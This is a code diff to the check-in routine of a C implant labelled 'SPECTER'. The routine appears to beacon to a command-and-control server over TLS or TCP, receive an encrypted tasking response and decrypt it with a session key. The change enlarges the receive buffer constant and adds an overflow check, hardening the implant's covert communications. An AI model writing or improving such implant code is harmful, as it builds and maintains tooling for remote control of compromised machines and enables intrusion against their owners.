@@ -1681,7 +1681,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     COMMS_TRACE("[SPECTER] checkin: sent, receiving response...");
 
     /* ---- Receive response (heap buffer) ---- */
-    resp_buf = (BYTE *)heap_alloc_cached(COMMS_RECV_BUF_SIZE);
+    resp_buf = (BYTE *)heap_alloc_cached(COMMS_RESPONSE_MAX_SIZE);
     if (!resp_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
     DWORD resp_total = 0;
 
@@ -1689,10 +1689,10 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         DWORD got = 0;
         if (comms->state == COMMS_STATE_TLS_CONNECTED)
             status = comms_tls_recv(comms, resp_buf + resp_total,
-                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
+                                     (DWORD)(COMMS_RESPONSE_MAX_SIZE - resp_total), &got);
         else
             status = comms_tcp_recv(comms, resp_buf + resp_total,
-                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
+                                     (DWORD)(COMMS_RESPONSE_MAX_SIZE - resp_total), &got);
         if (!NT_SUCCESS(status)) goto cleanup;
         resp_total += got;
 
@@ -1708,6 +1708,12 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                 break;
             }
             COMMS_TRACE("[SPECTER] checkin: waiting for response body");
+        }
+
+        if (resp_total >= COMMS_RESPONSE_MAX_SIZE) {
+            COMMS_TRACE("[SPECTER] checkin: response exceeds max buffer");
+            status = STATUS_BUFFER_TOO_SMALL;
+            goto cleanup;
         }
     }
 
@@ -1770,7 +1776,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
             const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE;
             const BYTE *resp_tag = resp_ct + resp_ct_len;
 
-            if (resp_ct_len <= COMMS_RECV_BUF_SIZE) {
+            if (resp_ct_len <= COMMS_RESPONSE_MAX_SIZE) {
                 resp_plain = (BYTE *)heap_alloc_cached(resp_ct_len);
                 if (resp_plain) {
                     BOOL ok = spec_aead_decrypt(comms->session_key, resp_nonce,
